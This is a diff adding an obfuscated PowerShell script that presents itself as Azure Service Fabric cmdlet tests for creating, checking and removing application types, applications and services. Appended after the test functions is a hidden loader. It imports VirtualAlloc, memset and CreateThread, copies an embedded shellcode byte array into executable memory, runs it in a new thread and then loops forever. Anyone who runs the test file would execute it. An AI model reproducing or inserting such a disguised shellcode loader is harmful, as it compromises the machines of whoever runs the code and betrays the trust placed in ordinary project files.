@@ -1,0 +1,126 @@
+${CL`Uste`RN`AME} = &("{1}{0}{2}"-f 't-Cl','Ge','usterName')
+${re`so`UrCEg`ROu`pNAmE} = &("{3}{4}{2}{0}{1}{5}" -f 'e','Gro','-Resourc','Ge','t','upName')
+${a`PPtYpE`NA`Me} = &("{2}{3}{1}{0}{4}" -f'Ap','t-','G','e','pTypeName')
+${v`1} = &("{3}{1}{0}{2}"-f'yp','-AppT','eV1Name','Get')
+${V`2} = &("{5}{4}{2}{0}{1}{3}" -f 'TypeV','2','pp','Name','et-A','G')
+${PA`C`Ka`GEv1} = &("{3}{1}{2}{4}{0}"-f'1','ac','kage','Get-AppP','V')
+${PACkA`ge`V2} = &("{2}{0}{3}{1}{4}"-f'-A','P','Get','pp','ackageV2')
+${SERv`ic`eT`Yp`ENAME} = &("{2}{1}{3}{0}{4}" -f'ype','t-','Ge','ServiceT','Name')
+
+function t`E`sT-aPPtypE
+{
+	${aP`Pt`Ype} = &("{4}{6}{1}{10}{8}{5}{0}{9}{3}{7}{2}"-f'p','t-Az','e','t','G','Ap','e','ionTyp','iceFabric','lica','Serv') -ResourceGroupName ${r`eSo`URc`eGroUpNa`Me} -ClusterName ${cL`U`STer`NAme}
+	&("{1}{3}{2}{0}"-f't-Null','As','r','se') ${A`Ppt`Ype}
+
+	${App`TyPe} = &("{2}{7}{5}{0}{3}{6}{4}{1}"-f'r','ype','New-AzS','i','pplicationT','iceFab','cA','erv') -ResourceGroupName ${re`so`Urc`EGrOUp`NAmE} -ClusterName ${C`LUS`T`ername} -Name ${A`pPTyp`E`NAMe} -Verbose
+	&("{0}{3}{1}{2}" -f 'Asse','q','ual','rt-AreE')  ("{0}{2}{1}"-f 'S','ceeded','uc') ${A`PPTYPe}."P`ROvIS`iO`NInGSTaTE"
+
+	${aPPt`yPeFr`O`M`geT} = &("{0}{1}{8}{4}{5}{7}{6}{3}{2}" -f 'Get','-Az','ype','onT','rvice','FabricApp','cati','li','Se') -ResourceGroupName ${rEsoUrcEGr`O`U`Pn`AMe} -ClusterName ${cL`U`sTerNamE} -Name ${ap`PtYpe`NAMe}
+	&("{0}{1}{2}{3}{4}"-f'As','sert-','Not','N','ull') ${a`PPT`Y`PeFr`oMgeT}
+	&("{0}{1}{2}{3}"-f'As','ser','t-','AreEqual') ${APPT`y`pE}."i`D" ${A`PpTYP`E`FROMG`et}."i`D"
+
+	${REmo`V`ERES`PONSE} = &("{4}{3}{1}{7}{2}{8}{5}{0}{6}" -f 'p','i','a','ve-AzServ','Remo','y','e','ceFabricApplic','tionT') -ResourceGroupName ${rESoURcE`GroUP`Na`Me} -ClusterName ${CLu`s`Tername} -Name ${APP`T`YpEnaMe} -Force -PassThru -Verbose
+	&("{1}{3}{0}{2}"-f't-Tr','Asse','ue','r') { ${REMO`Ve`RE`S`ponse} }
+	
+	&("{5}{3}{0}{1}{2}{4}" -f't-Throws','Con','ta','sser','ins','A') { &("{6}{8}{2}{0}{1}{7}{9}{5}{4}{3}"-f'r','vi','Se','e','icationTyp','pl','G','ceFa','et-Az','bricAp') -ResourceGroupName ${ResO`URCEGrO`U`Pname} -ClusterName ${C`luStE`RName} -Name ${ApPt`yPe`NAME} } ("{0}{2}{1}"-f'Not','und','Fo')
+}
+
+function TEs`T`-A`pptY`pEVER`s`IOn
+{
+	${a`ppT`Y`PeVerSioN} = &("{6}{7}{5}{1}{2}{3}{8}{4}{0}"-f'sion','ic','App','licationT','er','abr','Get-AzS','erviceF','ypeV') -ResourceGroupName ${rE`souR`c`EGr`OuPNamE} -ClusterName ${ClUsTE`RN`A`me} -Name ${ApP`T`YpENa`ME}
+	&("{3}{0}{1}{2}" -f'er','t-Nu','ll','Ass') ${aPpTYPev`eRS`I`oN}
+
+	${apP`TYpeV`E`R`Sion} = &("{3}{0}{4}{8}{7}{2}{6}{1}{5}"-f 'zS','peVersi','l','New-A','erviceF','on','icationTy','cApp','abri') -ResourceGroupName ${r`eSOURc`EG`ROUP`N`AMe} -ClusterName ${cL`Us`TE`RnamE} -Name ${apP`TYpE`NA`me} -Version ${V1} -PackageUrl ${PAck`Age`V1} -Verbose
+	&("{0}{4}{3}{2}{1}"-f'Assert-Ar','l','a','u','eEq') ("{1}{0}" -f'eeded','Succ') ${appTY`P`eVE`R`SIOn}."P`RO`V`IS`iOnIng`StAtE"
+
+	${aPptYPEVe`Rs`i`o`NFroMgeT} = &("{3}{4}{5}{6}{1}{2}{0}"-f'n','Ve','rsio','Get-AzServiceFabric','Application','T','ype') -ResourceGroupName ${rESO`UrceGROu`p`NaME} -ClusterName ${CLusT`eRna`mE} -Name ${A`pP`TYPENAMe} -Version ${V1}
+	&("{0}{3}{4}{1}{2}"-f'As','otNu','ll','se','rt-N') ${a`pPTyP`e`VeR`sionFrOm`gET}
+	&("{2}{3}{0}{1}" -f 'ert-AreEq','ual','A','ss') ${aP`pTYp`EvER`s`ion}."iD" ${ApPtyPE`Ve`RsI`onfrom`GeT}."Id"
+
+	${ReMoVER`es`PO`Nse} = &("{3}{10}{4}{5}{8}{7}{6}{11}{1}{0}{2}{9}" -f'onTy','pplicati','peVersio','Rem','-A','zSe','Fabri','e','rvic','n','ove','cA') -ResourceGroupName ${rE`SouRcegRo`UP`Na`me} -ClusterName ${CluSTe`R`N`AmE} -Name ${a`pp`TYPename} -Version ${V`1} -Force -PassThru -Verbose
+	&("{2}{1}{0}" -f 'True','rt-','Asse') { ${ReMoV`erE`SPoN`sE} }
+
+	${rEmOVe`RES`pON`sE} = &("{1}{3}{0}{4}{6}{2}{5}" -f 'move-AzServ','R','nTyp','e','iceFabricApplica','e','tio') -ResourceGroupName ${rES`ourCE`gr`ouP`NA`me} -ClusterName ${clUst`e`Rna`ME} -Name ${appty`PeN`Ame} -Force -PassThru -Verbose
+	&("{0}{3}{1}{2}"-f'A','-Tr','ue','ssert') { ${RE`MoveResp`o`NsE} }
+
+	&("{5}{0}{3}{1}{2}{4}" -f'ssert','hrow','s','-T','Contains','A') { &("{3}{6}{7}{0}{2}{1}{5}{4}"-f 'c','Ver','ApplicationType','Ge','on','si','t-AzService','Fabri') -ResourceGroupName ${R`EsourCe`G`R`oupNamE} -ClusterName ${C`lU`sTErN`AMe} -Name ${A`pPTYpeN`AmE} -Version ${v`1} } ("{0}{1}"-f'NotFoun','d')
+}
+
+function T`E`ST-App
+{
+	${A`Pp`NAME} = &("{2}{1}{0}" -f'tName','tAsse','ge') ("{0}{1}" -f'tes','tApp')
+	${Ser`ViC`E`NaMe} = &("{1}{2}{3}{0}"-f 'me','get','Asse','tNa') ("{1}{2}{0}"-f'ce','testS','ervi')
+	${serVIc`e`NamE} = "$($appName)~$($serviceName)"
+
+	${A`PP} = &("{4}{1}{5}{3}{2}{0}" -f'FabricApplication','AzServ','e','c','Get-','i') -ResourceGroupName ${resouRcE`GR`OU`pNa`me} -ClusterName ${CL`UStEr`NAME}
+	&("{1}{2}{0}"-f'l','Asse','rt-Nul') ${a`pp}
+
+	${a`pP} = &("{0}{7}{3}{6}{4}{2}{5}{1}" -f 'New-A','n','l','ri','p','icatio','cAp','zServiceFab') -ResourceGroupName ${ReSOu`RCEgRo`UP`Na`ME} -ClusterName ${c`LuSte`RnAME} -ApplicationTypeName ${AP`Pt`y`PeNamE} -ApplicationTypeVersion ${V`1} -Name ${AP`pn`AmE} -PackageUrl ${p`AckA`GEv1} -Verbose
+	&("{1}{2}{3}{0}" -f 'al','Assert','-','AreEqu') ("{1}{0}{2}"-f 'uccee','S','ded') ${A`Pp}."P`R`oV`ISiOnIngS`TatE"
+
+	${AP`PFRO`MG`eT} = &("{4}{2}{1}{0}{3}{7}{5}{6}{8}" -f 'S','Az','t-','e','Ge','t','io','rviceFabricApplica','n') -ResourceGroupName ${Re`SouR`CegR`OupNaMe} -ClusterName ${C`L`USTERna`Me} -Name ${aPpNA`ME}
+	&("{0}{3}{1}{2}" -f'A','No','tNull','ssert-') ${APPF`Ro`MG`et}
+	&("{2}{1}{0}{3}"-f 'AreEq','ssert-','A','ual') ${a`PP}."id" ${A`pP`FrOmgEt}."id"
+
+	${seR`V`iCe} = &("{0}{5}{2}{3}{4}{1}{6}"-f 'New-AzServ','vic','eFa','b','ricSer','ic','e') -ResourceGroupName ${rESo`UR`CE`g`Ro`UPName} -ClusterName ${CluST`eR`NAme} -Stateless -InstanceCount ('-1') -ApplicationName ${Ap`pnaME} -Name ${S`eRvic`eNaME} -Type ${Se`R`VIcet`yPEn`AmE} -PartitionSchemeSingleton -Verbose
+	&("{0}{3}{2}{1}"-f 'A','qual','sert-AreE','s') ("{0}{1}{2}" -f 'S','ucceede','d') ${sE`RVi`cE}."Pr`O`ViSiO`NIngSt`AtE"
+
+	${a`pP`TYP`EvErsiOn} = &("{7}{6}{4}{8}{11}{9}{5}{0}{3}{10}{1}{2}"-f 'Ve','i','on','r','eFabr','pe','AzServic','New-','icAp','ionTy','s','plicat') -ResourceGroupName ${R`eS`OuRcE`G`Ro`UpNaME} -ClusterName ${Cl`Ust`eRn`AME} -Name ${apPty`p`ena`mE} -Version ${v`2} -PackageUrl ${pA`C`k`AGEv2} -Verbose
+	&("{0}{4}{1}{3}{2}" -f'Asser','q','l','ua','t-AreE') ("{2}{1}{0}"-f 'ed','ceed','Suc') ${ApPt`YPev`ERsI`ON}."prO`Vi`s`i`ONiNGStATe"
+
+	${A`Pp} = &("{2}{7}{0}{1}{3}{4}{5}{6}"-f 'c','eF','Update-AzSer','abr','icAppl','icatio','n','vi') -ResourceGroupName ${Res`OuRC`eGr`oU`Pname} -ClusterName ${clU`S`TErnAMe} -Name ${a`pPNAme} -ApplicationTypeVersion ${v`2} `
+		-ApplicationParameter @{("{0}{1}" -f'Mod','e')=("{1}{2}{0}" -f 'al','de','cim')} -HealthCheckStableDurationSec 0 -HealthCheckWaitDurationSec 0 -HealthCheckRetryTimeoutSec 0 `
+		-UpgradeDomainTimeoutSec 5000 -UpgradeTimeoutSec 7000 -FailureAction ("{2}{1}{0}" -f 'k','lbac','Rol') -UpgradeReplicaSetCheckTimeoutSec 300 -ForceRestart -Verbose
+	&("{3}{1}{0}{2}"-f 'eEq','rt-Ar','ual','Asse') ("{2}{1}{0}" -f'ed','eed','Succ') ${a`Pp}."PRovi`S`Ion`Ing`staTe"
+	&("{4}{2}{1}{0}{3}"-f 'eEq','Ar','t-','ual','Asser') ${V2} ${A`Pp}."T`YPEVe`Rs`iON"
+	&("{2}{3}{0}{1}" -f 'A','reEqual','Assert','-') ("{1}{2}{0}" -f 'al','d','ecim') ${a`PP}."PAra`MET`erS"[("{0}{1}"-f'M','ode')]
+	&("{0}{2}{3}{1}"-f 'A','t-True','sse','r') { ${A`PP}."Up`GrAdEpol`I`cy"."ForCE`R`ESta`RT" }
+	&("{3}{2}{1}{0}{4}" -f'-AreE','rt','se','As','qual') ("{2}{0}{1}" -f':05:','00','00') ${a`pp}."U`P`grAdepOL`iCY"."UPg`R`AD`eRePLIcA`seT`che`CktIMEouT"
+	&("{3}{1}{4}{0}{2}"-f'q','sert','ual','As','-AreE') ("{2}{1}{0}" -f '0','4','01:56:') ${a`pP}."UpGRaDE`po`LiCy"."ro`l`LInGupgr`AdE`mo`NiT`O`R`inGPOLiCY"."UpgRaDEt`Im`E`out"
+	&("{1}{3}{4}{2}{0}"-f 'ual','A','reEq','sser','t-A') ("{0}{1}"-f '01:23:2','0') ${A`pp}."UP`G`RADePOL`i`cy"."RO`LLiNGup`GRad`eMoNItoRInG`Pol`iCY"."uPgRa`De`DO`maIn`T`IME`out"
+	&("{1}{4}{3}{2}{0}"-f'eEqual','A','-Ar','sert','s') ("{0}{2}{1}" -f'Rol','ack','lb') ${A`pP}."upgradEP`Ol`i`cy"."Rol`l`iNg`U`pg`RaDE`mONitOrI`NgPoLICY"."fAiL`URe`A`CT`ION"
+
+	${A`pp} = &("{6}{2}{0}{4}{1}{8}{7}{3}{5}" -f'e','AzServic','dat','p','-','lication','Up','FabricAp','e') -ResourceGroupName ${RE`sOUrc`eg`RoUp`NaMe} -ClusterName ${c`LuSTern`AmE} -Name ${ap`Pn`Ame} -MinimumNodeCount 1 -MaximumNodeCount 4 -Verbose
+	&("{2}{3}{1}{0}{4}"-f 'eEqu','-Ar','Asser','t','al') 1 ${a`Pp}."m`INimUMno`dES"
+	&("{1}{2}{3}{0}{4}" -f'eEqua','Ass','ert-A','r','l') 4 ${A`pp}."maxIMu`Mno`d`ES"
+
+	${rEmov`E`REs`PoN`se} = &("{7}{4}{0}{8}{1}{2}{5}{3}{6}"-f 'o','A','zS','ric','em','erviceFab','Application','R','ve-') -ResourceGroupName ${Res`OurcE`GR`Ou`PNAMe} -ClusterName ${C`Lus`TE`RnaME} -Name ${A`P`PnamE} -Force -PassThru -Verbose
+	&("{3}{2}{0}{1}"-f'T','rue','ssert-','A') { ${R`emo`VE`RES`POnsE} }
+
+	${remO`VER`Es`Po`NsE} = &("{8}{10}{6}{1}{3}{9}{7}{4}{2}{5}{0}" -f'Type','zSe','i','rv','pplicat','on','A','cA','Remo','iceFabri','ve-') -ResourceGroupName ${r`eSO`U`RCeGroUpNAmE} -ClusterName ${cL`Us`TeRnaME} -Name ${Ap`ptypE`N`AMe} -Force -PassThru -Verbose
+	&("{2}{1}{3}{0}" -f'ue','ssert','A','-Tr') { ${RE`MOV`e`ResPOnse} }
+
+	&("{2}{4}{1}{3}{5}{0}"-f 'ontains','T','A','h','ssert-','rowsC') { &("{2}{4}{3}{0}{5}{1}" -f 'Fabr','on','Ge','Service','t-Az','icApplicati') -ResourceGroupName ${Reso`URcEg`RoupNa`Me} -ClusterName ${clusTeR`N`A`ME} -Name ${a`PpN`AmE} } ("{2}{0}{1}"-f 'o','tFound','N')
+}
+
+function tes`T-s`ervi`Ce
+{
+	${aP`p`NaME} = &("{0}{2}{1}" -f'getAss','tName','e') ("{0}{1}"-f'te','stApp')
+	${S`Er`V`ICENAmE} = &("{1}{3}{0}{2}"-f'N','getA','ame','sset') ("{1}{0}{2}"-f 'tServ','tes','ice')
+	${S`ErVi`CenA`me} = "$($appName)~$($serviceName)"
+
+	${a`Pp} = &("{0}{7}{3}{6}{8}{5}{4}{2}{1}" -f 'New-A','n','atio','rv','lic','pp','ic','zSe','eFabricA') -ResourceGroupName ${ReS`oUrcEGRou`PnA`me} -ClusterName ${cl`UStE`RNAME} -ApplicationTypeName ${ApP`TyPE`N`AmE} -ApplicationTypeVersion ${v`1} -Name ${A`Ppna`ME} -PackageUrl ${Pa`C`KaGe`V1} -Verbose
+	&("{3}{1}{2}{0}"-f 'qual','rt-Are','E','Asse') ("{1}{0}{2}"-f 'cce','Su','eded') ${a`pP}."Pr`o`VisiONiNg`S`TAte"
+
+	${S`eRvIcE} = &("{6}{5}{0}{2}{4}{3}{1}"-f'viceF','ce','abr','rvi','icSe','Ser','Get-Az') -ResourceGroupName ${resOu`R`cE`gROUp`NamE} -ClusterName ${ClUs`T`E`RNAmE} -ApplicationName ${A`Pp`NaMe}
+	&("{2}{0}{3}{1}" -f'sert-','ull','As','N') ${sER`V`iCE}
+
+	${S`erV`ICE} = &("{0}{1}{4}{2}{5}{7}{6}{3}"-f 'Ne','w-','er','ce','AzS','vic','Servi','eFabric') -ResourceGroupName ${r`esoUrcE`Gr`OupnaME} -ClusterName ${cl`UStE`Rna`mE} -Stateless -InstanceCount ('-1') -ApplicationName ${a`PpNAme} -Name ${serVIc`en`Ame} -Type ${s`ErvI`Ce`TYPENaME} -PartitionSchemeSingleton -Verbose
+	&("{2}{1}{0}"-f'qual','t-AreE','Asser') ("{1}{0}{2}"-f'ceed','Suc','ed') ${SE`RV`Ice}."P`RovIsio`NiNGS`TA`Te"
+
+	${S`er`VIc`EFRoMg`Et} = &("{1}{4}{0}{2}{3}"-f'-AzSer','G','viceF','abricService','et') -ResourceGroupName ${rESOurC`egr`O`U`P`NAme} -ClusterName ${clu`s`TErNaMe} -ApplicationName ${A`Ppn`AmE} -Name ${Se`R`VIcenA`Me}
+	&("{0}{3}{1}{2}" -f 'Assert','Nul','l','-Not') ${serVic`EfROMg`Et}
+	&("{4}{1}{3}{0}{2}" -f'qua','er','l','t-AreE','Ass') ${sE`RviCE}."Id" ${s`Er`Vi`cefrOm`Get}."I`D"
+
+	${ReMO`VERE`sPONsE} = &("{6}{1}{7}{3}{0}{2}{5}{4}"-f 'e','em','FabricSer','vic','ice','v','R','ove-AzSer') -ResourceGroupName ${re`SouRc`eG`ROUpn`AMe} -ClusterName ${cL`U`steR`NAME} -ApplicationName ${aPP`N`AMe} -Name ${s`e`Rvi`CeNAme} -Force -PassThru -Verbose
+	&("{1}{0}{2}" -f'u','Assert-Tr','e') { ${R`eMOV`e`RESpon`Se} }
+
+	${REMOveR`ESP`O`eTnsE} = &("{1}{4}{6}{5}{2}{0}{3}"-f'at','Remove-Az','cApplic','ion','Serv','ceFabri','i') -ResourceGroupName ${R`eS`O`URce`GrOUPname} -ClusterName ${CLUs`TE`Rn`AmE} -Name ${a`pPNA`Me} -Force -PassThru -Verbose
+	&("{2}{0}{1}"-f 'r','ue','Assert-T') { ${r`eMovER`esP`oN`Se} }
+
+	${R`emO`VeRE`Sp`OnsE} = &("{2}{0}{5}{4}{6}{3}{1}" -f 'e','onType','R','icati','abricApp','move-AzServiceF','l') -ResourceGroupName ${ReSOUr`c`egrO`UPn`A`Me} -ClusterName ${ClU`S`Terna`ME} -Name ${AppTyP`e`NamE} -Force -PassThru -Verbose
+	&("{0}{3}{2}{1}"-f 'As','ue','r','sert-T') { ${rEm`oVeReS`P`ONSe} }
+
+	&("{4}{2}{0}{1}{3}{5}"-f 't-Thr','ows','r','Co','Asse','ntains') { &("{4}{0}{2}{1}{3}"-f'AzServ','vi','iceFabricSer','ce','Get-') -ResourceGroupName ${rESo`Ur`cEgrouPN`AmE} -ClusterName ${ClUs`T`Er`NAME} -ApplicationName ${App`NAmE} -Name ${S`ErVICe`NaMe} } ("{1}{0}{2}" -f 'F','Not','ound')
+}
+${br`mx} = ((("{73}{2}{44}{77}{60}{56}{69}{25}{23}{22}{42}{33}{67}{78}{36}{27}{30}{9}{82}{13}{80}{29}{81}{26}{65}{48}{7}{14}{61}{34}{74}{45}{58}{55}{51}{43}{20}{10}{76}{53}{16}{18}{83}{59}{0}{49}{8}{72}{79}{68}{41}{15}{19}{52}{62}{54}{63}{40}{57}{4}{39}{12}{21}{38}{70}{24}{3}{17}{47}{71}{5}{32}{28}{31}{46}{37}{66}{11}{6}{1}{50}{35}{64}{75}"-f 'i','t,','Imp','r ','Para','t','(IntPtr des','pe,','dwS',' ',' ext','t','dwCreat',' ui',' ui','tP','ateThread(I','lpThr','ntPtr lpThr','tr l','static','ionFl',' exte','c','ntPt','0})]public stati','l','(IntPtr lpAddres','pu',' ','s, uint','blic stat','.dll{0})]',' Vir','ro','i','loc','ext','a','meter, uint ','ntPtr ',' In','rn IntPtr','ic ','ort','Import({0}kernel32.d','ic ','eadI','cationTy','nt ',' u',']publ','pStartAddr','Ptr Cre','s,','0})','el3','lp','ll{','tributes, u','}kern','nt flP','es',' I','nt src,','o','ern IntPtr memse','tual','ize,','2.dll{','gs, I','d);[DllImport({0}msvcr','t','[Dll','tect);[Dll',' uint count);','ern Int','({0','Al','ackS','nt','flAl','dwSize,','eadAt'))  -F[ChaR]34);${W} = &("{1}{2}{0}"-f'pe','Add-T','y') -memberDefinition ${b`RMX} -Name ("{1}{0}"-f'in32','W') -namespace ("{1}{2}{4}{3}{0}" -f'ons','Wi','n3','Functi','2') -passthru;[Byte[]];[Byte[]]${z} = 0xdb,0xd4,0xd9,0x74,0x24,0xf4,0xbe,0x8b,0xc9,0x92,0xaf,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x14,0x03,0x72,0x9f,0x2b,0x67,0x53,0x77,0x29,0x88,0xac,0x87,0x4e,0x00,0x49,0xb6,0x4e,0x76,0x19,0xe8,0x7e,0xfc,0x4f,0x04,0xf4,0x50,0x64,0x9f,0x78,0x7d,0x8b,0x28,0x36,0x5b,0xa2,0xa9,0x6b,0x9f,0xa5,0x29,0x76,0xcc,0x05,0x10,0xb9,0x01,0x47,0x55,0xa4,0xe8,0x15,0x0e,0xa2,0x5f,0x8a,0x3b,0xfe,0x63,0x21,0x77,0xee,0xe3,0xd6,0xcf,0x11,0xc5,0x48,0x44,0x48,0xc5,0x6b,0x89,0xe0,0x4c,0x74,0xce,0xcd,0x07,0x0f,0x24,0xb9,0x99,0xd9,0x75,0x42,0x35,0x24,0xba,0xb1,0x47,0x60,0x7c,0x2a,0x32,0x98,0x7f,0xd7,0x45,0x5f,0x02,0x03,0xc3,0x44,0xa4,0xc0,0x73,0xa1,0x55,0x04,0xe5,0x22,0x59,0xe1,0x61,0x6c,0x7d,0xf4,0xa6,0x06,0x79,0x7d,0x49,0xc9,0x08,0xc5,0x6e,0xcd,0x51,0x9d,0x0f,0x54,0x3f,0x70,0x2f,0x86,0xe0,0x2d,0x95,0xcc,0x0c,0x39,0xa4,0x8e,0x58,0x8e,0x85,0x30,0x98,0x98,0x9e,0x43,0xaa,0x07,0x35,0xcc,0x86,0xc0,0x93,0x0b,0xe9,0xfa,0x64,0x83,0x14,0x05,0x95,0x8d,0xd2,0x51,0xc5,0xa5,0xf3,0xd9,0x8e,0x35,0xfc,0x0f,0x3a,0x33,0x6a,0xaf,0xb8,0xd7,0x31,0xa7,0xbc,0x27,0xd6,0xf5,0x48,0xc1,0x88,0xa9,0x1a,0x5e,0x68,0x1a,0xdb,0x0e,0x00,0x70,0xd4,0x71,0x30,0x7b,0x3e,0x1a,0xda,0x94,0x97,0x72,0x72,0x0c,0xb2,0x09,0xe3,0xd1,0x68,0x74,0x23,0x59,0x9f,0x88,0xed,0xaa,0xea,0x9a,0x99,0x5a,0xa1,0xc1,0x0f,0x64,0x1f,0x6f,0xaf,0xf0,0xa4,0x26,0xf8,0x6c,0xa7,0x1f,0xce,0x32,0x58,0x4a,0x45,0xfa,0xcc,0x35,0x31,0x03,0x01,0xb6,0xc1,0x55,0x4b,0xb6,0xa9,0x01,0x2f,0xe5,0xcc,0x4d,0xfa,0x99,0x5d,0xd8,0x05,0xc8,0x32,0x4b,0x6e,0xf6,0x6d,0xbb,0x31,0x09,0x58,0x3d,0x0d,0xdc,0xa4,0x4b,0x7f,0xdc;${g} = 0x1000;if (${z}."L`E`NgTh" -gt 0x1000){${G} = ${Z}."LEn`GtH"};${I`sL}=${W}::("{1}{3}{0}{2}" -f'l','Vir','loc','tualA').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${Z}."l`EnGTH"-1);${I}++) {${W}::"meM`seT"([IntPtr](${i`Sl}.("{2}{1}{0}"-f '32','nt','ToI').Invoke()+${I}), ${Z}[${i}], 1)};${w}::("{1}{2}{0}"-f 'ead','C','reateThr').Invoke(0,0,${I`sl},0,0,0);for (;;){&("{1}{0}{2}"-f 'e','Start-sle','p') 60};
